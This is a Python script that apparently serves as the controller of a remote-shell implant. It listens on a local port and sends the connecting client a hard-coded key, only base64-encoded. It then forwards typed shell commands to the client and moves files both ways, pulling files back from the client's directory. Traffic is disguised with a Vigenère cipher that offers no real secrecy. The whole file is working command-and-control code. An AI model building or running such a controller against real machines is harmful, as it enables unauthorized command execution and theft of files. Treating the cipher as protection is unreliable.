import socket
import sys
import os
import base64

KEY = "SAUSAGE"

def read_file(path):
    with open(path, "r") as f:
        return f.read()

def write_file(contents):
    with open("downloaded_file.txt", "w") as f:
        f.write(contents)

def key_exchange():
    key_bytes = KEY.encode('ascii')
    base64_bytes = base64.b64encode(key_bytes)
    enc_message = base64_bytes.decode('ascii')
    return enc_message

def encrypt(string):
    cipher_text = []
    j = 0
    for i in range(len(string)):
        c = string[i]
        lower = False
        if c.islower():
            lower = True
            c = c.upper()
        elif string[i].isupper():
            pass
        else: 
            cipher_text.append(string[i])
            continue
        x = (ord(c) + ord(KEY[j]) - 2 * ord('A')) % 26 # (c + key[j] - 2 * 'A') % 26 + 'A'
        x += ord('A')
        if lower:
            cipher_text.append(chr(x).lower())
        else:
            cipher_text.append(chr(x))
        j += 1
        if (j > len(KEY) - 1):
            j = 0
    return("".join(cipher_text))

def decrypt(cipher_text):
    orig_text = []
    j = 0
    for i in range(len(cipher_text)):
        c = cipher_text[i]
        lower = False
        if cipher_text[i].islower():
            lower = True
            c = c.upper()
        elif cipher_text[i].isupper():
            pass
        else: 
            orig_text.append(cipher_text[i])
            continue
        x = (ord(c) - ord(KEY[j]) + 26) % 26
        x += ord('A')
        if lower:
            orig_text.append(chr(x).lower())
        else:
            orig_text.append(chr(x))
        j += 1
        if (j > len(KEY) - 1):
            j = 0
    return("".join(orig_text))

def main():
    host = "127.0.0.1"
    port = 25565
    print('# Creating socket')
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_address = (host, port)
    s.bind(server_address)
    s.listen(5)
    while True:
        print("Waiting for connection")
        connection, client = s.accept()
        try:
            enc_key = key_exchange()
            connection.send(enc_key.encode())
            while True:
                print("Connected to client IP: {}".format(client))
                command = input("$>").strip()
                enc_command = encrypt(command)
                connection.send(enc_command.encode())
                if (command == "exit"):
                    break
                elif (command == "upload_file"):
                    file = input("File to Upload (must be in server cwd): ")
                    file_contents = read_file(file)
                    enc_cont = encrypt(file_contents)
                    connection.send(enc_cont.encode())
                    resp = decrypt(connection.recv(8192).decode())
                    print(resp)
                elif (command == "download_file"):
                    file = input("File to Download (must be in the client cwd, try uploaded_file...): ")
                    enc_file = encrypt(file)
                    connection.send(enc_file.encode())
                    resp = decrypt(connection.recv(8192).decode())
                    print("File Preview: " + resp[:9])
                    write_file(resp)
                    print("File written to server cwd")
                else:    
                    resp = connection.recv(8192).decode()
                    resp = decrypt(resp)
                    print(resp)
        finally:
            connection.close()
            break
    s.close()

main()
